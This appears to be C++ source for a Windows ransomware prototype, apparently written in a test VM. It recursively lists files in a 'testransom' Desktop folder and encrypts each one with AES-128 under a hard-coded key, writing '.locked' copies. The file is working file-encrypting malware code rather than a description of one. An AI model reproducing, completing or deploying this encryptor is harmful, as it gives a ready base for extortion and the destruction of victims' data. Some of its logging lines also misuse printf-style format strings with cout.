#include <iostream>
#include <Windows.h>
#include <Shlwapi.h>
#include <queue>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std; 

#define AES_KEY_SIZE 16
#define IN_CHUNK_SIZE (AES_KEY_SIZE * 10) // a buffer must be a multiple of the key size
#define OUT_CHUNK_SIZE (IN_CHUNK_SIZE * 2) // an output buffer (for encryption) must be twice as big

void CloseHandleLog(HANDLE h, const std::string& name) {
    ::CloseHandle(h);
    std::cerr << " [LOG] Handler <" << name << "> closed OK." << std::endl;
}

void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecrypt) {

    wchar_t default_key[] = L"3igcZhRdWq96m3GUmTAiv9";
    wchar_t* key_str = default_key;

    if (isDecrypt) {
        std::cout << "Decrypt mode\n";
        isDecrypt = TRUE;
    }
    /*if (argc >= 5) {
        key_str = argv[4];
    } */
    const size_t len = lstrlenW(key_str);
    const size_t key_size = len * sizeof(key_str[0]); // size in bytes

    cout << "Key: " <<  key_str << endl;
    cout << "Key len: " << len << endl;
    cout << "Key size: " << key_size << endl;
    wcout << "Input File: " << filename << endl;
    wcout << "Output File: " << filename2 << endl;
    cout << "----\n";

    HANDLE hInpFile = CreateFileW(
        filename,
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL
    );

    if (hInpFile == INVALID_HANDLE_VALUE) {
        cout << "Cannot open input file!\n";
        system("pause");
        return;
    }
    HANDLE hOutFile = CreateFileW(
        filename2,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    );

    if (hOutFile == INVALID_HANDLE_VALUE) {
        cout << "Cannot open output file!\n";
        system("pause");
        return;
    }

    if (isDecrypt) {
        cout << "DECRYPTING\n";
    }
    else {
        cout << "ENCRYPTING\n";
    }

    DWORD dwStatus = 0;
    BOOL bResult = FALSE;
    wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
    HCRYPTPROV hProv;
    if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        dwStatus = GetLastError();
        std::cout << "CryptAcquireContext failed: %x\n" << dwStatus;
        CryptReleaseContext(hProv, 0);
        system("pause");
        return;
    }
    HCRYPTHASH hHash;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        dwStatus = GetLastError();
        std::cout << "CryptCreateHash failed: %x\n" << dwStatus;
        CryptReleaseContext(hProv, 0);
        system("pause");
        return;
    }

    if (!CryptHashData(hHash, (BYTE*)key_str, key_size, 0)) {
        DWORD err = GetLastError();
        std::cout << "CryptHashData Failed : %#x\n" << err;
        system("pause");
        return;
    }
    std::cout << "[+] CryptHashData Success\n";

    HCRYPTKEY hKey;
    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
        dwStatus = GetLastError();
        std::cout << "CryptDeriveKey failed: %x\n" << dwStatus;
        CryptReleaseContext(hProv, 0);
        system("pause");
        return;
    }
    std::cout << "[+] CryptDeriveKey Success\n";

    const size_t chunk_size = isDecrypt ? IN_CHUNK_SIZE : OUT_CHUNK_SIZE;
    BYTE* chunk = new BYTE[chunk_size];
    DWORD out_len = 0;

    BOOL isFinal = FALSE;
    DWORD readTotalSize = 0;

    DWORD inputSize = GetFileSize(hInpFile, NULL);

    while (bResult = ReadFile(hInpFile, chunk, IN_CHUNK_SIZE, &out_len, NULL)) {
        if (0 == out_len) {
            break;
        }
        readTotalSize += out_len;
        if (readTotalSize >= inputSize) {
            isFinal = TRUE;
            std::cout << "Final chunk set, len: %d = %x" << out_len << " " << out_len << std::endl;
        }

        if (isDecrypt) {
            if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
                std::cout << "[-] CryptDecrypt failed: %x" << " " << GetLastError() << std::endl;
                break;
            }
        }
        else {
            if (!CryptEncrypt(hKey, NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
                std::cout << "[-] CryptEncrypt failed: %x" << " " << GetLastError() << std::endl;
                break;
            }
        }
        DWORD written = 0;
        if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
            std::cout << "writing failed!\n";
            break;
        }
        memset(chunk, 0, chunk_size);
    }

    delete[]chunk; chunk = NULL;

    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);

    CloseHandle(hInpFile);
    CloseHandle(hOutFile);
    std::cout << "Finished. Processed %#x bytes.\n" << readTotalSize << std::endl;
}

void FindFile(const std::wstring& directory, wstring ext, queue<wstring> &results)
{
    std::wstring tmp = directory + L"\\*";
    WIN32_FIND_DATAW file;
    HANDLE search_handle = FindFirstFileW(tmp.c_str(), &file);
    if (search_handle != INVALID_HANDLE_VALUE)
    {
        std::vector<std::wstring> directories;

        do
        {
            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                if ((!lstrcmpW(file.cFileName, L".")) || (!lstrcmpW(file.cFileName, L"..")))
                    continue;
            }

            tmp = directory + L"\\" + std::wstring(file.cFileName);
            wcout << tmp << endl;
            if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && PathMatchSpecW(file.cFileName, ext.c_str())) {
                //wcout << "pushed " << tmp.c_str() << endl;
                results.push(tmp);
            }

            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                directories.push_back(tmp);
        } while (FindNextFileW(search_handle, &file));

        FindClose(search_handle);

        for (std::vector<std::wstring>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
            FindFile(*iter, ext, results);

        //std::wcout << tmp << std::endl;
    }
}
//params: <input file> <output file> <is decrypt mode> <key>
int wmain(int argc, wchar_t* argv[])
{
    /*
    if (argc < 4) {
        printf("params: <input file> <output file> <is decrypt mode> [*key]\n");
        system("pause");
        return 0;
    }*/

    const wchar_t* filename = L"c:\\users\\vagrant\\Desktop\\important.txt";
    const wchar_t* filename2 = L"c:\\users\\vagrant\\Desktop\\important.locked";

    wstring directoryPath2 = L"C:\\Users\\vagrant\\Desktop\\testransom";
    queue<wstring> results;
    // TODO: list of extensions
    FindFile(directoryPath2, L"", results);

    wstring el;
    cout << "popping" << endl;
    while (results.size()) {
        el = results.front();

        wcout << "ciphering " << el.c_str() << endl;
        wcout << "ciphering " << (el + L".locked").c_str() << endl;
        encryptFile(el.c_str(), (el + L".locked").c_str(), false);

        results.pop();
        wcout << el << endl;
    }

    cout << "queue ready" << endl;
    cout << "number of el " << results.size() << endl;
    return 0;
}
